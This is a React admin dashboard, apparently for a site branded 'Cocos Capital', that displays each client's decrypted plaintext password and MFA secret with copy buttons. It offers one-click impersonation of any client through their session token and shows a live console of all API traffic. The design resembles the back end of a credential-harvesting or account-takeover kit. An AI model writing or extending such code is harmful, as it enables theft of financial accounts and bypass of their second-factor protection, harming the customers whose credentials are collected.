/**
 * Admin Dashboard
 * Main admin panel with client management and API console
 */

import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { toast } from "sonner";
import { 
  Shield, 
  Users, 
  Activity, 
  LogOut, 
  Eye, 
  EyeOff, 
  Copy, 
  ExternalLink,
  Terminal,
  RefreshCw
} from "lucide-react";

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const [adminSession, setAdminSession] = useState<any>(null);
  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});
  const [autoRefresh, setAutoRefresh] = useState(true);

  // Check admin session
  useEffect(() => {
    const session = localStorage.getItem("admin_session");
    if (!session) {
      setLocation("/admin/login");
      return;
    }
    setAdminSession(JSON.parse(session));
  }, [setLocation]);

  // Queries
  const { data: clients, refetch: refetchClients } = trpc.admin.getAllClients.useQuery(undefined, {
    enabled: !!adminSession,
    refetchInterval: autoRefresh ? 5000 : false, // Auto-refresh every 5 seconds
  });

  const { data: apiLogs, refetch: refetchLogs } = trpc.admin.getRecentApiLogs.useQuery(
    { limit: 50 },
    {
      enabled: !!adminSession,
      refetchInterval: autoRefresh ? 3000 : false, // Auto-refresh every 3 seconds
    }
  );

  // Mutations
  const loginAsClientMutation = trpc.admin.loginAsClient.useMutation({
    onSuccess: (data) => {
      toast.success("Sessão de cliente iniciada!");
      // Open in new window
      const clientWindow = window.open("/", "_blank");
      if (clientWindow) {
        // Store impersonation token
        clientWindow.localStorage.setItem("admin_impersonation_token", data.sessionToken);
      }
    },
    onError: (error) => {
      toast.error(error.message || "Erro ao fazer login como cliente");
    },
  });

  const handleLogout = () => {
    localStorage.removeItem("admin_session");
    setLocation("/admin/login");
    toast.success("Logout realizado");
  };

  const togglePasswordVisibility = (userId: number) => {
    setShowPasswords((prev) => ({
      ...prev,
      [userId]: !prev[userId],
    }));
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copiado!`);
  };

  const handleLoginAsClient = (userId: number) => {
    if (confirm("Deseja fazer login como este cliente? Uma nova janela será aberta.")) {
      loginAsClientMutation.mutate({ clientUserId: userId });
    }
  };

  if (!adminSession) {
    return null;
  }

  return (
    <div className="min-h-screen bg-slate-900">
      {/* Header */}
      <div className="bg-slate-800 border-b border-slate-700 shadow-lg">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Shield className="w-8 h-8 text-blue-500" />
              <div>
                <h1 className="text-2xl font-bold text-white">Painel Administrativo</h1>
                <p className="text-sm text-slate-400">Cocos Capital - Gerenciamento de Clientes</p>
              </div>
            </div>
            <div className="flex items-center gap-4">
              <Badge variant="outline" className="text-green-400 border-green-400">
                {adminSession.email}
              </Badge>
              <Button
                variant="outline"
                size="sm"
                onClick={handleLogout}
                className="text-slate-300 border-slate-600 hover:bg-slate-700"
              >
                <LogOut className="w-4 h-4 mr-2" />
                Sair
              </Button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-8">
        <Tabs defaultValue="clients" className="space-y-6">
          <TabsList className="bg-slate-800 border border-slate-700">
            <TabsTrigger value="clients" className="data-[state=active]:bg-blue-600">
              <Users className="w-4 h-4 mr-2" />
              Clientes
            </TabsTrigger>
            <TabsTrigger value="api-console" className="data-[state=active]:bg-blue-600">
              <Terminal className="w-4 h-4 mr-2" />
              Console de API
            </TabsTrigger>
            <TabsTrigger value="sessions" className="data-[state=active]:bg-blue-600">
              <Activity className="w-4 h-4 mr-2" />
              Sessões Ativas
            </TabsTrigger>
          </TabsList>

          {/* Clients Tab */}
          <TabsContent value="clients" className="space-y-4">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle className="text-white">Lista de Clientes</CardTitle>
                    <CardDescription className="text-slate-400">
                      Todos os dados de autenticação e MFA
                    </CardDescription>
                  </div>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => refetchClients()}
                    className="text-slate-300 border-slate-600"
                  >
                    <RefreshCw className="w-4 h-4 mr-2" />
                    Atualizar
                  </Button>
                </div>
              </CardHeader>
              <CardContent>
                <div className="overflow-x-auto">
                  <Table>
                    <TableHeader>
                      <TableRow className="border-slate-700">
                        <TableHead className="text-slate-300">ID</TableHead>
                        <TableHead className="text-slate-300">Email</TableHead>
                        <TableHead className="text-slate-300">Senha</TableHead>
                        <TableHead className="text-slate-300">MFA</TableHead>
                        <TableHead className="text-slate-300">MFA Secret</TableHead>
                        <TableHead className="text-slate-300">Última API</TableHead>
                        <TableHead className="text-slate-300">Ações</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {clients?.map((client) => (
                        <TableRow key={client.id} className="border-slate-700">
                          <TableCell className="text-slate-300">{client.userId}</TableCell>
                          <TableCell className="text-slate-300 font-mono text-sm">
                            {client.email}
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => copyToClipboard(client.email, "Email")}
                              className="ml-2 h-6 w-6 p-0"
                            >
                              <Copy className="w-3 h-3" />
                            </Button>
                          </TableCell>
                          <TableCell className="text-slate-300">
                            {client.passwordDecrypted ? (
                              <div className="flex items-center gap-2">
                                <code className="text-xs bg-slate-700 px-2 py-1 rounded">
                                  {showPasswords[client.userId]
                                    ? client.passwordDecrypted
                                    : "••••••••"}
                                </code>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => togglePasswordVisibility(client.userId)}
                                  className="h-6 w-6 p-0"
                                >
                                  {showPasswords[client.userId] ? (
                                    <EyeOff className="w-3 h-3" />
                                  ) : (
                                    <Eye className="w-3 h-3" />
                                  )}
                                </Button>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() =>
                                    copyToClipboard(client.passwordDecrypted!, "Senha")
                                  }
                                  className="h-6 w-6 p-0"
                                >
                                  <Copy className="w-3 h-3" />
                                </Button>
                              </div>
                            ) : (
                              <span className="text-slate-500">-</span>
                            )}
                          </TableCell>
                          <TableCell>
                            {client.mfaEnabled ? (
                              <Badge variant="default" className="bg-green-600">
                                Ativo
                              </Badge>
                            ) : (
                              <Badge variant="secondary" className="bg-slate-600">
                                Inativo
                              </Badge>
                            )}
                          </TableCell>
                          <TableCell className="text-slate-300">
                            {client.mfaSecret ? (
                              <div className="flex items-center gap-2">
                                <code className="text-xs bg-slate-700 px-2 py-1 rounded">
                                  {client.mfaSecret.substring(0, 8)}...
                                </code>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => copyToClipboard(client.mfaSecret!, "MFA Secret")}
                                  className="h-6 w-6 p-0"
                                >
                                  <Copy className="w-3 h-3" />
                                </Button>
                              </div>
                            ) : (
                              <span className="text-slate-500">-</span>
                            )}
                          </TableCell>
                          <TableCell className="text-slate-400 text-xs">
                            {client.lastApiCall
                              ? new Date(client.lastApiCall).toLocaleString("pt-BR")
                              : "-"}
                          </TableCell>
                          <TableCell>
                            <Button
                              variant="default"
                              size="sm"
                              onClick={() => handleLoginAsClient(client.userId)}
                              className="bg-blue-600 hover:bg-blue-700"
                            >
                              <ExternalLink className="w-3 h-3 mr-1" />
                              Login
                            </Button>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* API Console Tab */}
          <TabsContent value="api-console" className="space-y-4">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle className="text-white">Console de API em Tempo Real</CardTitle>
                    <CardDescription className="text-slate-400">
                      Todas as requisições e respostas das APIs
                    </CardDescription>
                  </div>
                  <div className="flex items-center gap-2">
                    <Badge
                      variant={autoRefresh ? "default" : "secondary"}
                      className={autoRefresh ? "bg-green-600" : "bg-slate-600"}
                    >
                      {autoRefresh ? "Auto-refresh ON" : "Auto-refresh OFF"}
                    </Badge>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setAutoRefresh(!autoRefresh)}
                      className="text-slate-300 border-slate-600"
                    >
                      <RefreshCw className="w-4 h-4" />
                    </Button>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-[600px] overflow-y-auto">
                  {apiLogs?.map((log) => (
                    <div
                      key={log.id}
                      className="bg-slate-900 border border-slate-700 rounded-lg p-4 space-y-2"
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <Badge
                            variant={log.responseStatus && log.responseStatus < 400 ? "default" : "destructive"}
                            className={
                              log.responseStatus && log.responseStatus < 400
                                ? "bg-green-600"
                                : "bg-red-600"
                            }
                          >
                            {log.method}
                          </Badge>
                          <code className="text-sm text-blue-400">{log.endpoint}</code>
                        </div>
                        <span className="text-xs text-slate-500">
                          {new Date(log.createdAt).toLocaleTimeString("pt-BR")}
                        </span>
                      </div>
                      {log.requestBody && (
                        <div>
                          <p className="text-xs text-slate-400 mb-1">Request:</p>
                          <pre className="text-xs bg-slate-950 p-2 rounded overflow-x-auto text-slate-300">
                            {JSON.stringify(log.requestBody, null, 2)}
                          </pre>
                        </div>
                      )}
                      {log.responseBody && (
                        <div>
                          <p className="text-xs text-slate-400 mb-1">Response:</p>
                          <pre className="text-xs bg-slate-950 p-2 rounded overflow-x-auto text-slate-300">
                            {JSON.stringify(log.responseBody, null, 2)}
                          </pre>
                        </div>
                      )}
                      {log.error && (
                        <div>
                          <p className="text-xs text-red-400 mb-1">Error:</p>
                          <pre className="text-xs bg-red-950 p-2 rounded overflow-x-auto text-red-300">
                            {log.error}
                          </pre>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Sessions Tab */}
          <TabsContent value="sessions" className="space-y-4">
            <Card className="bg-slate-800 border-slate-700">
              <CardHeader>
                <CardTitle className="text-white">Sessões de Impersonação Ativas</CardTitle>
                <CardDescription className="text-slate-400">
                  Sessões onde você está logado como cliente
                </CardDescription>
              </CardHeader>
              <CardContent>
                <p className="text-slate-400 text-center py-8">
                  Funcionalidade em desenvolvimento
                </p>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
